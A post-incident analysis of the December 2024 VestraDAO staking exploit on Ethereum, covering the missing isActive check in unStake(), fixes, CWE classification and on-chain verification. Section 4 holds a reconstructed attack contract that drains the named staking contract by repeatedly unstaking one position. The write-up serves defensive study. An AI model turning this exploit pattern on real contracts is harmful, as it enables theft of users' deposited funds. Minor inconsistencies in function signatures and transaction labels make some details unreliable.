# VestraDAO — Staking Business Logic Vulnerability Analysis (Missing isActive Validation)

| Item | Details |
|------|------|
| **Date** | 2024-12-04 |
| **Protocol** | VestraDAO (VSTR) |
| **Chain** | Ethereum |
| **Loss** | ~73,720,000 VSTR (approx. $378,400 ~ $500,000) — swapped for 125 ETH and mixed via Tornado Cash |
| **Attacker** | [0x9543...cb97](https://etherscan.io/address/0x954386cb43dd2f0f637710a10f6b2d0f86aacb97) |
| **Attack Contract** | [0x81AD...75c4](https://etherscan.io/address/0x81ad996ac000d5dfdc65880a9e4ee487629375c4) |
| **Attack Tx #1 (Initial Setup)** | [0xa0dc...1798](https://etherscan.io/tx/0xa0dcf9b177702c58c5d0353aff2caeab12589bce204fb2d0e62ccbf5717f1798) |
| **Attack Tx #2 (Repeated Drain)** | [0x2139...44c7](https://etherscan.io/tx/0x213991ca681019f599f8f52a25ab6a5e39e690eac2ad206faf24f0c549e844c7) |
| **Vulnerable Contract** | [0x8a30...8e3](https://etherscan.io/address/0x8a30d684b1d3f8f36b36887a3deca0ef2a36a8e3) (LockedStaking) |
| **Attack Block** | #21,329,629 |
| **Root Cause** | Missing `isActive` state validation in `unStake()` — repeated calls on an already-unstaked position extracted 20,000 VSTR profit each time |
| **PoC Source** | DeFiHackLabs (2024-12 directory) |

---

## 1. Vulnerability Overview

VestraDAO is a locked staking protocol that pays yield in exchange for locking up VSTR tokens for a fixed period. Approximately one month after launch, on December 4, 2024, an attack revealed a critical business logic flaw in the `unStake()` function of the LockedStaking contract (`0x8a30d684b1d3f8f36b36887a3deca0ef2a36a8e3`).

The core vulnerability is a **missing state-machine validation**. The `unStake()` function should verify that the target staking position has `isActive = true` upon invocation. However, the actual implementation omits this check, allowing repeated calls on positions that have already been unstaked (i.e., `isActive = false`).

The attacker exploited this flaw via the following mechanism:

1. One month before the attack, staked 500,000 VSTR with a 1-month maturity (attack preparation)
2. After maturity, called `unStake()` for the first time → received 500,000 principal + 20,000 VSTR yield
3. Called `unStake()` repeatedly on the same position → extracted an additional 20,000 VSTR each time
4. To prevent `totalStaked` underflow, restaked 500,000 VSTR via new accounts each cycle to sustain the loop
5. Repeated until the contract balance was drained

On-chain verification confirmed that a single primary attack transaction (`0x2139...`) executed 60 cycles, resulting in a net outflow of **1,200,000 VSTR** from the staking contract. The contract balance was 782,031,188 VSTR before the attack and dropped to 780,831,188 VSTR after.

---

## 2. Vulnerable Code Analysis

### 2.1 LockedStaking.unStake() — Missing isActive Validation (Core Vulnerability)

**Vulnerable code** (reconstructed):

```solidity
// ❌ Vulnerable code — LockedStaking.sol (0x8a30d684b1d3f8f36b36887a3deca0ef2a36a8e3)
// Compiler: Solidity v0.8.20

struct StakeInfo {
    uint256 amount;         // Staking principal
    uint256 maturityTime;   // Maturity timestamp
    uint256 yield;          // Accrued yield
    bool isActive;          // ❌ Position active flag — not used for validation
}

mapping(address => StakeInfo[]) public stakes;

function unStake(uint256 stakeIndex) external {
    StakeInfo storage info = stakes[msg.sender][stakeIndex];

    // ❌ isActive validation completely absent
    // require(info.isActive, "Position already unstaked");  ← this line is missing

    // ❌ Only checks maturity (passes even after initial unstake)
    require(block.timestamp >= info.maturityTime, "Stake not matured");

    uint256 reward = info.yield;  // Yield paid out on every call

    // ❌ State not updated before transfer — violates CEI pattern
    // In practice, isActive is never set to false, or
    // if it is, the external call precedes the update with no reentrancy protection

    // Deduct from totalStaked (attacker continuously restakes to prevent underflow)
    totalStaked -= info.amount;

    // Transfer principal + yield
    VSTR.transfer(msg.sender, info.amount + reward);

    // ❌ isActive = false is either absent or ineffective without validation
    // info.isActive = false;  ← missing or ineffective
}
```

**Fixed code**:

```solidity
// ✅ Fixed code — isActive validation + CEI pattern applied

function unStake(uint256 stakeIndex) external {
    StakeInfo storage info = stakes[msg.sender][stakeIndex];

    // ✅ 1. isActive state validation (core fix)
    require(info.isActive, "Position already unstaked");

    // ✅ 2. Maturity check
    require(block.timestamp >= info.maturityTime, "Stake not matured");

    uint256 amount = info.amount;
    uint256 reward = info.yield;

    // ✅ 3. CEI pattern: complete all state changes before external calls
    info.isActive = false;       // Block reentrancy / repeated calls
    info.amount = 0;             // Clear principal
    info.yield = 0;              // Clear yield
    totalStaked -= amount;       // Update total staked

    // ✅ 4. Transfer only after state is fully updated
    VSTR.transfer(msg.sender, amount + reward);

    emit UnStaked(msg.sender, stakeIndex, amount, reward);
}
```

**Issue**: The `isActive` field exists but is never used for validation when entering `unStake()`. The same position can be called repeatedly after the initial unstake, and the `yield` value is transferred on every call. This is a classic business logic flaw where **a state machine is defined but its transition rules are not enforced**.

### 2.2 Absence of totalStaked Underflow Protection Mechanism

```solidity
// ❌ Vulnerable code — totalStaked underflow risk
// If the attacker only repeatedly unstakes, totalStaked goes negative and reverts
// → Attacker works around this by restaking 500,000 VSTR via sub-accounts each cycle

// Result: attack can loop indefinitely as long as the contract's actual VSTR balance > 0
totalStaked -= info.amount;  // Solidity 0.8+ underflow check causes revert

// ✅ Fix — blocking the totalStaked deduction itself via isActive validation resolves this
```

---

## 3. Attack Flow

### 3.1 Preparation Phase (approx. 1 month prior, early November 2024)

- Attacker (0x9543...) deploys the attack contract (`0x81AD...`)
- Stakes **500,000 VSTR with a 1-month maturity** via the attack contract
- Prepares multiple sub-accounts (to resupply 500,000 VSTR each cycle)

### 3.2 Execution Phase (2024-12-04, Blocks #21,329,625 ~ #21,329,629)

**Tx #1 (Block #21,329,625) — Initial setup and small-scale test**:
1. Attack contract calls `unStake(positionId=100)` → receives 500,000 principal + 20,000 yield
2. Confirms immediate re-call is possible due to missing `isActive` validation

**Tx #2 (Block #21,329,629) — Large-scale repeated drain (60 cycles)**:

```
Execution sequence per cycle:
1. Attack contract → Sub-account N: transfer 500,000 VSTR
2. Sub-account N → LockedStaking: stake(500,000 VSTR) (maintain totalStaked)
3. Attack contract → LockedStaking: re-call unStake(original position)
4. LockedStaking → Attack contract: return 520,000 VSTR (500,000 + 20,000 yield)
   ↑ Net profit: 20,000 VSTR per cycle
```

### 3.3 Attack Flow Diagram

```
  [Attacker EOA: 0x9543...]
         │
         │ Deploy + initial 500K VSTR stake (~1 month prior)
         ▼
  ┌─────────────────────────┐
  │   AttackContract        │
  │   0x81AD...75c4         │
  └─────────┬───────────────┘
            │
            │ ① Each cycle: transfer 500K VSTR
            ▼
  ┌─────────────────────────┐
  │   SubAccount N          │◄── New account created each cycle
  │   (60 sub-accounts)     │
  └─────────┬───────────────┘
            │
            │ ② stake(500K VSTR)
            │    → maintain totalStaked (prevent underflow)
            ▼
  ┌─────────────────────────────────────────────┐
  │         LockedStaking Contract              │
  │         0x8a30d684...                       │
  │                                             │
  │  stake():                                   │
  │    totalStaked += 500,000 VSTR              │
  │                                             │
  │  unStake(originalPosition):                 │
  │  ❌ require(isActive) missing               │
  │    totalStaked -= 500,000 VSTR              │
  │    transfer(attacker, 500K + 20K VSTR)      │
  └───────────────────┬─────────────────────────┘
                      │
                      │ ③ Return 520,000 VSTR
                      │   (500K principal + 20K yield)
                      ▼
  ┌─────────────────────────┐
  │   AttackContract        │
  │   Net profit: +20,000   │
  │   VSTR (60 cycles)      │
  └─────────────────────────┘
            │
            │ ④ Acquired VSTR → swap to ETH
            ▼
  ┌─────────────────────────┐
  │   DEX (Uniswap etc.)    │
  │   VSTR → ETH swap       │
  └─────────┬───────────────┘
            │
            │ ⑤ 125 ETH → Tornado Cash
            ▼
  ┌─────────────────────────┐
  │   Tornado Cash          │
  │   (funds laundering)    │
  └─────────────────────────┘
```

### 3.4 Outcome

| Item | Value |
|------|------|
| Total cycles (single Tx) | 60 cycles |
| Net profit per cycle | 20,000 VSTR |
| Net outflow (single Tx) | 1,200,000 VSTR |
| Total VSTR stolen | ~73,720,000 VSTR |
| ETH equivalent profit | 125 ETH |
| USD loss | ~$378,400 ~ $500,000 |
| Staking balance before attack | 782,031,188.24 VSTR |
| Balance after attack (Tx #1) | 780,831,188.24 VSTR |
| Gas cost | ~$40,000 (including Beaverbuild fee for fast inclusion) |
| VSTR token price impact | $0.013 → $0.005 (approx. 61% crash) |

---

## 4. PoC Code (Core Attack Logic)

The following is the core logic of the attack contract reconstructed through on-chain transaction analysis.

```solidity
// VestraDAO attack contract core logic (reconstructed)
// Attack contract: 0x81AD996AC000d5dfdC65880a9E4ee487629375c4

interface ILockedStaking {
    // Staking function — creates a new position
    function stake(uint256 amount, uint256 maturityPeriod) external;

    // Unstaking function — ❌ no isActive validation
    // Can be called repeatedly with the same positionId
    function unStake(uint256 positionId, uint256 amount, bool flag) external;
}

contract VestraAttack {
    ILockedStaking constant staking =
        ILockedStaking(0x8a30d684b1d3f8f36b36887a3deca0ef2a36a8e3);
    IERC20 constant VSTR =
        IERC20(0x92d5942f468447f1f21c2092580f15544923b434);

    // Position ID staked one month before the attack
    uint256 constant ORIGINAL_POSITION = 100;
    uint256 constant STAKE_AMOUNT = 500_000 ether;
    uint256 constant YIELD_PER_CALL = 20_000 ether;

    // ① Large-scale repeated drain function
    function attack(uint256 cycles) external {
        for (uint256 i = 0; i < cycles; i++) {
            // ② Deploy sub-account — to prevent totalStaked underflow
            SubStaker sub = new SubStaker();
            VSTR.transfer(address(sub), STAKE_AMOUNT);

            // ③ Sub-account stakes a new position (replenishes totalStaked)
            sub.stake(address(staking), address(VSTR), STAKE_AMOUNT);

            // ④ Re-call unStake on the original position
            //    ❌ Always passes due to missing isActive validation
            staking.unStake(ORIGINAL_POSITION, STAKE_AMOUNT, false);

            // Result: receives STAKE_AMOUNT + YIELD_PER_CALL
            // Net profit: YIELD_PER_CALL (20,000 VSTR) per cycle
        }
    }
}

// Sub-account contract — newly deployed each cycle
contract SubStaker {
    function stake(
        address _staking,
        address _vstr,
        uint256 _amount
    ) external {
        IERC20(_vstr).approve(_staking, _amount);
        // Stake with 1-month (30-day) maturity → totalStaked += STAKE_AMOUNT
        ILockedStaking(_staking).stake(_amount, 30 days);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing state validation for unstaked positions (isActive) | CRITICAL | CWE-754 |
| V-02 | CEI pattern violation (external transfer before state update) | HIGH | CWE-362 |
| V-03 | Economic model allows repeated extraction without re-staking precondition | HIGH | CWE-840 |

### V-01: Missing State Validation for Unstaked Positions

- **Description**: The `unStake()` function does not check the position's `isActive` field on entry. After the initial unstake, the position remains with `isActive = false`, but this value is never used for validation, allowing the same position to be called an unlimited number of times.
- **Impact**: An attacker can repeatedly call the same position to drain all yield reserves from the contract until the yield source is exhausted.
- **Attack Precondition**: At least one staking position with a completed maturity must exist. The attacker requires approximately one month of advance preparation.
- **CWE-754** (Improper Check for Unusual or Exceptional Conditions): The function fails to validate the precondition `isActive` state, resulting in an abnormal execution path.

### V-02: CEI Pattern Violation

- **Description**: The `unStake()` function does not safely update state (`isActive`, `totalStaked`) before performing the external token transfer (`VSTR.transfer`).
- **Impact**: Combined with V-01, enables reentrancy or repeated calls within the same transaction.
- **Attack Precondition**: A token standard that supports external callbacks, or — as in V-01 — the complete absence of state transition validation.
- **CWE-362** (Race Condition): Logic flaw caused by incorrect ordering of state updates.

### V-03: Economic Model Repeated Extraction Vulnerability

- **Description**: Even after a staking position is deactivated, the `yield` value is never cleared, so the same yield is paid out on every repeated call to the same position.
- **Impact**: Unlimited extraction until the yield reserve is exhausted.
- **Attack Precondition**: The missing state validation in V-01 is a prerequisite.
- **CWE-840** (Business Logic Error): State transitions outside the designed economic flow are permitted.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Core fix: isActive validation + CEI pattern + data clearing

function unStake(uint256 stakeIndex) external nonReentrant {
    StakeInfo storage info = stakes[msg.sender][stakeIndex];

    // ✅ Fix 1: isActive state validation (mandatory)
    require(info.isActive, "VestraStaking: position already closed");

    // ✅ Fix 2: Maturity check
    require(block.timestamp >= info.maturityTime, "VestraStaking: not yet matured");

    // ✅ Fix 3: Copy values to local variables
    uint256 principal = info.amount;
    uint256 reward = info.yield;

    // ✅ Fix 4: CEI — update all state before external calls
    info.isActive = false;    // Deactivate position
    info.amount = 0;          // Clear principal (prevent double-spend)
    info.yield = 0;           // Clear yield (prevent double-spend)
    totalStaked -= principal; // Deduct from total staked

    // ✅ Fix 5: Transfer only after state is fully updated
    VSTR.safeTransfer(msg.sender, principal + reward);

    emit UnStaked(msg.sender, stakeIndex, principal, reward);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing isActive validation (V-01) | Add `require(info.isActive)` guard; consider fully deleting position data after unstake (`delete stakes[msg.sender][stakeIndex]`) |
| CEI pattern violation (V-02) | Apply `nonReentrant` modifier; always complete state changes before external calls |
| Missing yield reset (V-03) | Explicitly set `info.yield = 0` on unstake; resolved automatically if using the position deletion approach |
| No circuit breaker | Add emergency pause (`pause`) functionality; auto-halt on detection of abnormal large withdrawals |
| No audit performed | Mandatory professional code review by a security auditor before production deployment |

---

## 7. Lessons Learned

1. **Enforce state machine transitions**: In position-based protocols, merely defining state fields such as `isActive` or `isClaimed` is insufficient. **A guard that validates these states must be present at every function entry point.**

2. **Follow the CEI (Checks-Effects-Interactions) pattern**: State changes must always precede external calls. This prevents not only reentrancy attacks but also repeated extraction caused by business logic errors.

3. **Completeness of initialization**: Upon position closure, all related state variables (`amount`, `yield`, `isActive`) must be fully reset, or the position itself must be deleted. Partial initialization leaves unexpected reuse paths open.

4. **A formal audit before launch is not optional — it is mandatory**: VestraDAO was attacked approximately one month after launch, suggesting the absence of a professional security audit prior to production deployment. Staking contracts that hold user deposits must be audited by a qualified firm at least once before going live.

5. **Include advance-setup attacks in the threat model**: This attack involved a preparation phase in which the attacker established a position approximately one month in advance. Staking protocols must explicitly define a threat model covering position states after maturity.

6. **Precedent of similar staking vulnerabilities**: Double-claim style attacks have occurred multiple times in the past (LevelFinance 2023, Platypus 2023, etc.). Validation of staking position closure is an industry-standard security requirement.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Analysis Estimate | On-Chain Actual | Match |
|------|------------|-------------|------|
| Transfer per cycle (staking contract → attacker) | 520,000 VSTR | 520,000 VSTR | ✅ |
| Sub-account → contract transfer per cycle | 500,000 VSTR | 500,000 VSTR | ✅ |
| Net profit per cycle | 20,000 VSTR | 20,000 VSTR | ✅ |
| Cycle count in primary attack Tx | 60 | 60 | ✅ |
| Net outflow in primary attack Tx | 1,200,000 VSTR | 1,200,000 VSTR | ✅ |
| Staking balance before attack | 782M VSTR (est.) | 782,031,188.24 VSTR | ✅ |
| Staking balance after attack | 780M VSTR (est.) | 780,831,188.24 VSTR | ✅ |

### 8.2 On-Chain Event Log Sequence (1 Cycle)

Transfer event pattern within the primary attack Tx (`0x2139...`) (Logs #1–#12, 1-cycle basis):

```
Log #1:  Transfer  AttackContract(0x81ad) → SubAccount(0xf92a)  500,000 VSTR
Log #3:  Transfer  SubAccount(0xf92a)     → Staking(0x8a30)     500,000 VSTR  [stake()]
Log #5:  Transfer  Staking(0x8a30)        → AttackContract(0x81ad) 520,000 VSTR [unStake()]
         ↑ Net profit: +20,000 VSTR
Log #8:  Transfer  AttackContract(0x81ad) → SubAccount(0x1162)  500,000 VSTR  [next cycle]
...
```

The above pattern repeats 60 times. Total log count: 420 entries (predominantly Transfer events).

### 8.3 Precondition Verification (Block #21,329,628, immediately before attack)

| Verification Item | Value |
|---------|-----|
| Staking contract VSTR balance | 782,031,188.24 VSTR |
| Attack block number | #21,329,629 |
| Attack Tx #1 block | #21,329,625 (initial setup) |
| Attack Tx #2 block | #21,329,629 (large-scale drain) |
| gasUsed (Tx #2) | 12,436,504 (0xBDB818) |

---

## References

- [Cryptopolitan — VestraDAO Hack Report](https://www.cryptopolitan.com/vestra-dao-vstr-smart-contract-exploited/)
- [QuillAudits — Decoding Vestra DAO's $500K Exploit](https://medium.com/coinmonks/overview-c1a710e0ea9f)
- [Vestra DAO VSTR Token — Etherscan](https://etherscan.io/token/0x92d5942f468447f1f21c2092580f15544923b434)
- [Vulnerable Contract — Etherscan](https://etherscan.io/address/0x8a30d684b1d3f8f36b36887a3deca0ef2a36a8e3)
- [Attack Tx (Primary)](https://etherscan.io/tx/0x213991ca681019f599f8f52a25ab6a5e39e690eac2ad206faf24f0c549e844c7)
- [Attack Tx (Initial)](https://etherscan.io/tx/0xa0dcf9b177702c58c5d0353aff2caeab12589bce204fb2d0e62ccbf5717f1798)
- [Related Pattern: 17_staking_reward.md](../patterns/17_staking_reward.md)
- [Related Pattern: 11_logic_error.md](../patterns/11_logic_error.md)

---

*Written: 2026-04-11 | Category: Business Logic Flaw | Chain: Ethereum | Severity: CRITICAL*